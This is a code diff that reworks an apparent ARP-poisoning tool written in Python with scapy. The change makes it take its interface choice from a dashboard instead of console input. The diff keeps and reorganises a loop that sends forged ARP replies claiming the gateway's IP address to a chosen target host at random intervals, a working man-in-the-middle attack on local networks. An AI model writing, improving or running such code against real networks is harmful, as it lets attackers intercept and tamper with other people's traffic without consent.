@@ -38,50 +38,38 @@ class ARPPoison:
         self.active   = True
         self.inactive = False
 
-        if target_ip:
-            self.target_ip = target_ip
-
-        if self.target_ip is None:
-            self.target_ip = input("Enter target IP: ")
-
         try:
-            while self.active:
-                try:
-                    if self.target_mac is None:
-                        self.target_mac = get_mac(self.target_ip)
-                    if self.source_mac is None:
-                        self.source_mac = my_mac
-                    if self.router_ip is None:
-                        self.router_ip = NetInfo.get("gateway")
-                    if self.router_mac is None:
-                        self.router_mac = gateway_mac
+            # Resolve MACs/IPs once before entering the loop
+            if self.target_ip and self.target_mac is None:
+                self.target_mac = get_mac(self.target_ip)
+            if self.router_ip is None:
+                self.router_ip = NetInfo.get("gateway")
+            if self.router_mac is None:
+                self.router_mac = gateway_mac
 
-                    ifaces_list  = list(self.ifaces)
-                    for i, iface in enumerate(ifaces_list, start=1):
-                        print(f"  {i}. {iface}")
-                    iface_choice    = int(input("Select interface: "))
-                    selected_iface  = ifaces_list[iface_choice - 1]
+            # Wait for dashboard to deliver interface selection
+            while not self.input_ready and not self.stop_requested:
+                time.sleep(0.1)
 
-                except Exception as e:
-                    print(f"Setup error: {e}")
-                    break
+            if self.stop_requested:
+                self.active = False
+                self.inactive = True
+                return
 
-                if self.stop or self.stop_requested:
-                    break
+            selected_iface   = self.selected_iface
+            self.input_ready = False                   # reset for next run
 
+            while self.active and not self.stop_requested:
                 try:
                     pkt = (Ether(dst=self.target_mac) /
-                           ARP(iface=selected_iface,
-                               psrc=self.router_ip,
-                               pdst=self.target_ip))
+                        ARP(iface=selected_iface,
+                            psrc=self.router_ip,
+                            pdst=self.target_ip))
                     answered, _ = srloop(pkt, inter=RandNum(10, 40), count=20)
                     for _, received in answered:
                         self.response.append(f"Response: {received.summary()}")
                 except Exception as e:
-                    print(f"Packet error: {e}")
-                    break
-
-                if self.stop or self.stop_requested:
+                    self.response.append(f"Packet error: {e}")
                     break
 
         except KeyboardInterrupt:
